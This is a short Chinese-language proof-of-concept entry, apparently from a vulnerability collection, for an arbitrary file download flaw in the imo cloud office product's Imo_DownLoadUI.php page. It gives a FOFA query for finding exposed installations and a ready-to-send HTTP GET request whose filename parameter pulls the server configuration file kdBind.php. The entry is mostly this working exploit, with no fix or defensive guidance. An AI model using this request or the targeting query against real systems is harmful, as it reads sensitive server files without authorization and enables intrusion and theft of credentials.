# imo云办公室接口Imo_DownLoadUI.php任意文件下载漏洞

imo云办公室由于 /file/Placard/upload/Imo_DownLoadUI.php 页面 filename 参数过滤不严，导致可以读取系统敏感文件

## fofa

```javascript
app="IMO-云办公室"
```

## poc

```javascript
GET /file/Placard/upload/Imo_DownLoadUI.php?cid=1&uid=1&type=1&filename=/OpenPlatform/config/kdBind.php HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive
Host: 
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
```

![imo 云办公室 Imo_DownLoadUI.php 任意文件下载漏洞](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202409111031851.png)